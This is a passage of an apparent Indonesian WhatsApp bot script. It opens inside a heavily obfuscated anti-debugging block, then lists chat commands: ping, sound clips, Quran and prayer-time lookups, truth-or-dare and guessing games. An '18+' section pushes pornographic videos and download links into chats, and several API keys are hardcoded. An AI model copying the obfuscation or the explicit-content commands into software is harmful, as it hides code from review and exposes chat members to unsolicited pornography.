d2c[_0x58dbca(-0x25a,-0x1d3,-0x12e,'Ug(K',-0x141)](_0x33ddc0,-0x1627+-0xae2*-0x3+-0x17d*0x7),0x20*0xec+-0x2*0xd22+-0x8a*0x6))_0x392d2c[_0x433cb2(0xb5,0x2e,-0xb,-0x6b,'sP1(')](_0x392d2c[_0x58dbca(-0x11f,-0x1a9,-0x1fe,'DZ7Q',-0x15c)],_0x392d2c[_0x433cb2(0x223,0x194,0x9c,0x1b1,'gDBy')])?_0x392d2c[_0x169fc2(-0x1ee,-0x162,-0x1a3,'DZ7Q',-0x94)](_0x29cb94,this,function(){var _0x5c2d4b=new _0x25687f(_0x4a18bd[_0x13d0e2(-0x14,'[nAp',0xd0,-0xf6,-0x1b)]);function _0x13d0e2(_0x323df9,_0x1ff4ae,_0x40d789,_0x1d4efa,_0x6d551d){return _0x58dbca(_0x323df9-0xc3,_0x6d551d-0x66,_0x40d789-0x118,_0x1ff4ae,_0x6d551d-0x1de);}function _0x4c6c7e(_0x27327a,_0x2312d9,_0x266a1e,_0x154e39,_0xcad6c7){return _0x169fc2(_0x27327a-0xfd,_0x2312d9-0x151,_0x2312d9-0x764,_0x266a1e,_0xcad6c7-0x160);}var _0xc5fe65=new _0x35ff24(_0x4a18bd[_0x13d0e2(-0x100,'q0t1',0x38,0x33,-0xa2)],'i');function _0xffe563(_0x6c1711,_0xc3a23,_0x2f56e3,_0x4528e7,_0x2e972c){return _0x58dbca(_0x6c1711-0x8a,_0x6c1711-0x543,_0x2f56e3-0x142,_0x2e972c,_0x2e972c-0x111);}function _0x25334f(_0x5daddb,_0xa9ada6,_0x468966,_0x22f792,_0x372cdc){return _0x390e41(_0x5daddb-0xe4,_0x372cdc,_0x468966-0x6f,_0x468966-0x47,_0x372cdc-0x10f);}function _0x3864c6(_0x2ddfa0,_0x4d40d0,_0xcc0a0e,_0x4c9df4,_0x3fa90f){return _0x3fd31c(_0x2ddfa0-0xc0,_0x4d40d0-0x1e1,_0x4c9df4-0x6aa,_0x4c9df4-0xc4,_0xcc0a0e);}var _0x4df756=_0x4a18bd[_0x13d0e2(-0x123,']h48',-0x274,-0x26f,-0x1ab)](_0x43df00,_0x4a18bd[_0x13d0e2(0xb,'sP1(',-0x91,-0xcd,-0x103)]);!_0x5c2d4b[_0x4c6c7e(0x61f,0x5b5,'pQ5H',0x590,0x4d1)](_0x4a18bd[_0x4c6c7e(0x4dd,0x565,'SBUC',0x556,0x5c6)](_0x4df756,_0x4a18bd[_0x4c6c7e(0x5db,0x5d6,'*Opm',0x50a,0x6e6)]))||!_0xc5fe65[_0x4c6c7e(0x3bc,0x444,'aCbI',0x411,0x4ae)](_0x4a18bd[_0x25334f(0x312,0x42e,0x3b4,0x3b9,'I))K')](_0x4df756,_0x4a18bd[_0xffe563(0x3eb,0x408,0x471,0x317,'1[)J')]))?_0x4a18bd[_0x4c6c7e(0x5c4,0x5d3,'wj^F',0x6ae,0x50a)](_0x4df756,'0'):_0x4a18bd[_0x25334f(0x4f2,0x58f,0x583,0x68a,'dcS@')](_0x56c509);})():function(){function _0x20ca9a(_0x31cae2,_0x37b53b,_0x5144fa,_0x5e5474,_0x5b59e1){return _0x169fc2(_0x31cae2-0xcd,_0x37b53b-0x18b,_0x5b59e1-0x2,_0x5144fa,_0x5b59e1-0xa8);}function _0xbe5f27(_0xb27433,_0xbe2b57,_0x2515ac,_0x10246b,_0x5b7110){return _0x3fd31c(_0xb27433-0x77,_0xbe2b57-0x1c2,_0x5b7110-0x135,_0x10246b-0xe0,_0x10246b);}function _0x475259(_0xb6e9e2,_0x32bbcc,_0x23577d,_0xc53fbf,_0x1b1904){return _0x390e41(_0xb6e9e2-0x10,_0x23577d,_0x23577d-0xa2,_0x1b1904- -0x529,_0x1b1904-0x1e1);}function _0x522ca9(_0x276cdf,_0x4c0ca3,_0x42fa8c,_0x2df760,_0x21ffa8){return _0x433cb2(_0x276cdf-0x14,_0x276cdf-0x3c,_0x42fa8c-0x2d,_0x2df760-0x69,_0x42fa8c);}if(_0x392d2c[_0x20ca9a(-0x34b,-0x325,'2krx',-0x1e3,-0x2cc)](_0x392d2c[_0x20ca9a(-0x30c,-0x375,'z7eL',-0x2e9,-0x316)],_0x392d2c[_0x522ca9(0x87,0x146,'EEvd',0x124,0xa8)])){if(_0x1efff7)return _0xc93545;else _0x4a18bd[_0x475259(0xcd,-0x61,'YDrV',-0x64,-0x3b)](_0x48dd4e,0x440+-0x40d*-0x5+-0x1881);}else return!![];}[_0x3fd31c(-0x1eb,-0x71,-0x160,-0x267,'q0t1')+_0x390e41(0x465,'q0t1',0x3a9,0x44f,0x363)+'r'](_0x392d2c[_0x169fc2(-0xcc,-0xe3,-0x1d7,'SBUC',-0x115)](_0x392d2c[_0x169fc2(-0x25c,-0x32c,-0x31c,'wW7^',-0x36a)],_0x392d2c[_0x3fd31c(-0x156,-0x1d9,-0x128,-0xe4,'huxa')]))[_0x390e41(0x426,'&ixT',0x509,0x427,0x4e7)](_0x392d2c[_0x169fc2(-0x2b9,-0x348,-0x2d3,'DZ7Q',-0x221)]);else{if(_0x392d2c[_0x169fc2(-0x3e5,-0x32b,-0x2df,']h48',-0x3a2)](_0x392d2c[_0x433cb2(0x22f,0x201,0x1a8,0x157,'huxa')],_0x392d2c[_0x169fc2(-0x2b8,-0x1e0,-0x27d,'y6Ys',-0x288)])){if(_0x3af402){var _0x391ee7=_0x3d86bc[_0x58dbca(-0x11d,-0x1d1,-0x25f,'cSL]',-0x20b)](_0xc48bc0,arguments);return _0x11c240=null,_0x391ee7;}}else(function(){function _0x3b4ce8(_0x34c9e3,_0x162bff,_0x2cfe35,_0x217c12,_0x1c5168){return _0x169fc2(_0x34c9e3-0x1f2,_0x162bff-0x1d1,_0x217c12-0x3b4,_0x162bff,_0x1c5168-0x154);}function _0x280151(_0x5cfd68,_0x501763,_0x3b06a2,_0x5e5424,_0x36b822){return _0x169fc2(_0x5cfd68-0x1c8,_0x501763-0x19a,_0x501763-0xb6,_0x3b06a2,_0x36b822-0x4c);}var _0x44a2d2={'WokYq':function(_0x1ede12){function _0x398e72(_0x2a7bba,_0x95e0e,_0x29a02b,_0x10339e,_0x31fdb4){return _0x5e48(_0x10339e- -0x2ac,_0x31fdb4);}return _0x392d2c[_0x398e72(-0x1ff,-0x15e,-0xef,-0x165,'pQ5H')](_0x1ede12);}};function _0x3e74f4(_0x4c2d17,_0x322229,_0x50329e,_0x51ec9f,_0x1ad9f0){return _0x58dbca(_0x4c2d17-0xb8,_0x51ec9f-0x1e5,_0x50329e-0x3f,_0x322229,_0x1ad9f0-0x19f);}function _0x2681cb(_0x5649b9,_0x2dc3ec,_0x3bed92,_0x7399e0,_0x34cd32){return _0x169fc2(_0x5649b9-0xd5,_0x2dc3ec-0xec,_0x7399e0-0x257,_0x5649b9,_0x34cd32-0x168);}if(_0x392d2c[_0x280151(-0xda,-0x151,'[nAp',-0x4f,-0x14f)](_0x392d2c[_0x3b4ce8(0x165,'dcS@',0x258,0x22f,0x14a)],_0x392d2c[_0x280151(-0x1fc,-0x247,'*&]L',-0x25d,-0x144)]))_0x44a2d2[_0x3e74f4(-0x58,'Ug(K',-0xbf,-0xae,-0x1b9)](_0x54bd11);else return![];}[_0x433cb2(0x9a,0xa1,0xbb,0x16a,'&ixT')+_0x58dbca(-0x17d,-0x1fd,-0x257,'%[n2',-0x23d)+'r'](_0x392d2c[_0x169fc2(-0x31b,-0x35e,-0x285,'kBcZ',-0x17f)](_0x392d2c[_0x390e41(0x5a9,'kBcZ',0x503,0x49b,0x43f)],_0x392d2c[_0x3fd31c(-0x2ac,-0x106,-0x1cb,-0x13a,'ZVi2')]))[_0x433cb2(0xb9,0x1b3,0x1a0,0x1ba,'SBUC')](_0x392d2c[_0x390e41(0x5c3,'KRl^',0x444,0x53f,0x4d4)]));}}function _0x3fd31c(_0x58c6d6,_0x4bfa3e,_0x281285,_0x4a1bd1,_0x66ea24){return _0x487aae(_0x58c6d6-0xf1,_0x4bfa3e-0x68,_0x66ea24,_0x281285- -0x4e0,_0x66ea24-0x1cc);}function _0x58dbca(_0x161427,_0x2812f8,_0x21aeaa,_0x3e145c,_0xbeb139){return _0x2ca475(_0x161427-0x6a,_0x2812f8-0x14a,_0x2812f8- -0x664,_0x3e145c,_0xbeb139-0x132);}function _0x169fc2(_0x5e5559,_0x5f587d,_0x79852b,_0x28f60a,_0x4056d6){return _0x4ce4b8(_0x79852b- -0x498,_0x28f60a,_0x79852b-0x15c,_0x28f60a-0xe6,_0x4056d6-0xc1);}_0x392d2c[_0x390e41(0x506,'y6Ys',0x444,0x3f4,0x366)](_0x15870d,++_0x33ddc0);}try{if(_0x20bef3)return _0x15870d;else _0x392d2c[_0x555fe3(-0x1d6,'gDBy',-0x1e4,-0x1b6,-0x260)](_0x15870d,0xe81+0x5*-0x46d+-0x1*-0x7a0);}catch(_0x5c457d){}}
break

//━━━━━━━━━━━━━━━[ INFO BOT ]━━━━━━━━━━━━━━━━━//

case "speed":
case "ping":
timestamp = speed();
latensi = speed() - timestamp;
exec(`neofetch --stdout`, (error, stdout, stderr) => {
child = stdout.toString("utf-8");
ssd = child.replace(/Memory:/, "Ram:");
pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
reply(pingnya);
});
break
case "runtime":
case "test":
run = process.uptime();
teks = `${kyun(run)}`;
reply(teks);
break

//━━━━━━━━━━━━━━━[ FITUR SOUND ]━━━━━━━━━━━━━━━━━//

case 'sound1':
sound = fs.readFileSync('./audio/audio1.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
sound = fs.readFileSync('./audio/audio2.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
sound = fs.readFileSync('./audio/audio3.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
sound = fs.readFileSync('./audio/audio4.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
sound = fs.readFileSync('./audio/audio5.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
sound = fs.readFileSync('./audio/audio6.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
sound = fs.readFileSync('./audio/audio7.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound8':
sound = fs.readFileSync('./audio/audio8.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound9':
sound = fs.readFileSync('./audio/audio9.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound10':
sound = fs.readFileSync('./audio/audio10.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound11':
sound = fs.readFileSync('./audio/audio11.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound12':
sound = fs.readFileSync('./audio/audio12.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound13':
sound = fs.readFileSync('./audio/audio13.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound14':
sound = fs.readFileSync('./audio/audio14.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break
case 'sound15':
sound = fs.readFileSync('./audio/audio15.mp3')
zeroyt7.sendMessage(from, sound, MessageType.audio, {quoted: fakevo, mimetype: 'audio/mp4', ptt:true})
break

//━━━━━━━━━━━━━━━[ FITUR ISLAMIC ]━━━━━━━━━━━━━━━━━//

case 'listsurah':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = 'List Surah:\n'
for (var x in get_result) {
ini_txt += `${x}. ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'alquran':
if (args.length < 1) return reply(`Nomor Surah Yg Mau Di Cari Mana\nContoh : ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${zerokey}`
quran = await fetchJson(urls)
result = quran.result
ayat = result.ayat
ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
arab = x.arab
nomor = x.ayat
latin = x.latin
indo = x.indonesia
ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
}
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
reply(ini_txt)
break
case 'alquranaudio':
if (args.length == 0) return reply(`Nomor Surah Yg Mau Dicari Mana\nContoh : ${prefix + command} 18 or ${prefix + command} 18/10`)
reply('Sabar Sedang Proses...')
surah = args[0]
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${zerokey}`)
await zeroyt7.sendMessage(from, ini_buffer, audio, { quoted: ftrol, mimetype: Mimetype.mp4Audio })
break
case 'asmaulhusna':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `No : ${get_result.index}\n`
ini_txt += `Latin: ${get_result.latin}\n`
ini_txt += `Arab : ${get_result.ar}\n`
ini_txt += `Indonesia : ${get_result.id}\n`
ini_txt += `English : ${get_result.en}`
reply(ini_txt)
break
case 'kisahnabi':
if (args.length == 0) return reply(`Nama Nabi Yg Mau Dicari Mana\nContoh : ${prefix + command} Muhammad`)
query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Name : ${get_result.name}\n`
ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
ini_txt += `Umur : ${get_result.age}\n`
ini_txt += `Tempat : ${get_result.place}\n`
ini_txt += `Story : \n${get_result.story}`
reply(ini_txt)
break
case 'jadwalsholat':
if (args.length == 0) return reply(`Nama Kotanya Mana\nContoh : ${prefix + command} Yogyakarta`)
daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${zerokey}`)
get_result = get_result.result
ini_txt = `Wilayah : ${get_result.wilayah}\n`
ini_txt += `Tanggal : ${get_result.tanggal}\n`
ini_txt += `Sahur : ${get_result.sahur}\n`
ini_txt += `Imsak : ${get_result.imsak}\n`
ini_txt += `Subuh : ${get_result.subuh}\n`
ini_txt += `Terbit : ${get_result.terbit}\n`
ini_txt += `Dhuha : ${get_result.dhuha}\n`
ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
ini_txt += `Ashar : ${get_result.ashar}\n`
ini_txt += `Maghrib : ${get_result.imsak}\n`
ini_txt += `Isya : ${get_result.isya}`
reply(ini_txt)
break

//━━━━━━━━━━━━━━━[ FITUR 18+ ]━━━━━━━━━━━━━━━━━//

case 'bokep':

reply(mess.wait)

aprii = await getBuffer (`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)

zeroyt7.sendMessage(from, aprii, video, {mimetype: 'video/mp4', quoted: ftrol})

break
case 'dosa1':				 

qute = fs.readFileSync('./zeroyt7/zero.jpg') 
zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })

break

case 'dosa2':

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })

break

case 'dosa3':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    

break

case 'dosa4':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   

break

case 'dosa5':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   

break

case 'dosa6':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   

break

case 'dosa7':

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   

break

case 'dosa8':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   

break

case 'dosa10':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   

break

case 'dosa11':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   

break

case 'dosa12':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   

break

case 'dosa13':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   

break

case 'dosa14':	

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   

break

case 'dosa15':

qute = fs.readFileSync('./zeroyt7/zero.jpg') 

zeroyt7.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   

break


//━━━━━━━━━━━━━━━[ FITUR GAME ]━━━━━━━━━━━━━━━━━//

case 'truth':
const trut = ['Pernah suka sama siapa aja? berapa lama?', 'Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)', 'apa ketakutan terbesar kamu?', 'pernah suka sama orang dan merasa orang itu suka sama kamu juga?', 'Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?', 'pernah gak nyuri uang nyokap atau bokap? Alesanya?', 'hal yang bikin seneng pas lu lagi sedih apa', 'pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?', 'pernah jadi selingkuhan orang?', 'hal yang paling ditakutin', 'siapa orang yang paling berpengaruh kepada kehidupanmu', 'hal membanggakan apa yang kamu dapatkan di tahun ini', 'siapa orang yang bisa membuatmu sange', 'siapa orang yang pernah buatmu sange', '(bgi yg muslim) pernah ga solat seharian?', 'Siapa yang paling mendekati tipe pasangan idealmu di sini', 'suka mabar(main bareng)sama siapa?', 'pernah nolak orang? alasannya kenapa?', 'Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget', 'pencapaian yang udah didapet apa aja ditahun ini?', 'kebiasaan terburuk lo pas di sekolah apa?']
var ttrth = (await fetchJson(`https://pencarikode.xyz/api/truthid?apikey=APIKEY`)).message
var bff = Buffer.alloc(0)
sendButLocation(from, `_*Truth*_\n\n${ttrth}`, `${tampilUcapan}`, fs.readFileSync("./zeroyt7/trorda.jpeg"), [ { buttonId: `${prefix}truth`, buttonText: { displayText: "➡️ NEXT" }, type: 1 } ], { contextInfo: { mentionedJid: [sender] }})                 
break
case 'dare':
const dare = ['Prank mak bilang "aku hamil" (bagi cewe) atau "Aku hamilin anak orang" (bagi cowo)\nrecord terus kirim kesini', 'Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu', 'telfon crush/pacar sekarang dan ss ke pemain', 'pap ke salah satu anggota grup', 'Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo', 'ss recent call whatsapp', 'drop emot 🤥 setiap ngetik di gc/pc selama 1 hari', 'kirim voice note bilang can i call u baby?', 'drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu', 'pake foto sule sampe 3 hari', 'ketik pake bahasa daerah 24 jam', 'ganti nama menjadi "gue anak lucinta luna" selama 5 jam', 'chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you', 'prank chat mantan dan bilang " i love u, pgn balikan', 'record voice baca surah al-kautsar', 'bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini', 'sebutkan tipe pacar mu!', 'snap/post foto pacar/crush', 'teriak gajelas lalu kirim pake vn kesini', 'pap mukamu lalu kirim ke salah satu temanmu', 'kirim fotomu dengan caption, aku anak pungut', 'teriak pake kata kasar sambil vn trus kirim kesini', 'teriak " anjimm gabutt anjimmm " di depan rumah mu', 'ganti nama jadi " BOWO " selama 24 jam', 'Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
var der = (await fetchJson(`https://pencarikode.xyz/api/dareid?apikey=APIKEY`)).message
var bff = Buffer.alloc(0)
sendButLocation(from, `_*Dare*_\n\n${der}`, `${tampilUcapan}`, fs.readFileSync("./zeroyt7/trorda.jpeg"), [ { buttonId: `${prefix}truth`, buttonText: { displayText: "Truth" }, type: 1 }, { buttonId: `${prefix}dare`, buttonText: { displayText: "Dare" }, type: 1} ], { contextInfo: { mentionedJid: [sender] }})
break
case 'tebakkalimat':
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kalimat`, {method: 'get'})
get = `*${anu.result.soal}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: ftrol})
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text)
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text)
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text)
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text)
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: ftrol})
}, 0) // 1000 = 1s,
break
case 'tebaktebakan':
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/tebakan`, {method: 'get'})
get = `*${anu.result.soal}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: ftrol}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text)
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: ftrol})
}, 0) // 1000 = 1s,
break
case 'tebaklirik':
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/lirik`, {method: 'get'})
get = `*${anu.result.question}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.answer, text, {quoted: ftrol}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: ftrol})
}, 0) // 1000 = 1s,
break
case 'tebakkimia':
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/kimia`, {method: 'get'})
get = `*${anu.result.nama}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.lambang, text, {quoted: ftrol}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text)
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text)
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text)
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, get, text, {quoted: ftrol}) 
}, 0) // 1000 = 1s,
break
case 'tebakjenaka':
anu = await fetchJson(`https://velgrynd.herokuapp.com/api/tebak/jenaka`, {method: 'get'})
tebakjenaka = `*${anu.result.pertanyaan}*`
setTimeout( () => {
zeroyt7.sendMessage(from, 'Jawaban: '
+anu.result.jawaban, text, {quoted: ftrol}) 
}, 60000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_10 Detik lagi..._', text) 
}, 50000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_20 Detik lagi..._', text) 
}, 40000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_30 Detik lagi..._', text) 
}, 30000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_40 Detik lagi..._', text) 
}, 20000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_50 Detik lagi..._', text) 
}, 10000) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, '_60 Detik lagi..._', text) 
}, 2500) // 1000 = 1s,
setTimeout( () => {
zeroyt7.sendMessage(from, tebakjenaka, text, {quoted: ftrol}) 
}, 0) // 1000 = 1s,
break
case 'tebakgambar':
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/tebakgambar?apikey=Ikyy69`, {method: 'get'})
ngebuff = await getBuffer(anu.img)
tebak = `Jawaban : *${anu.jawaban}*`
setTimeout( () => {
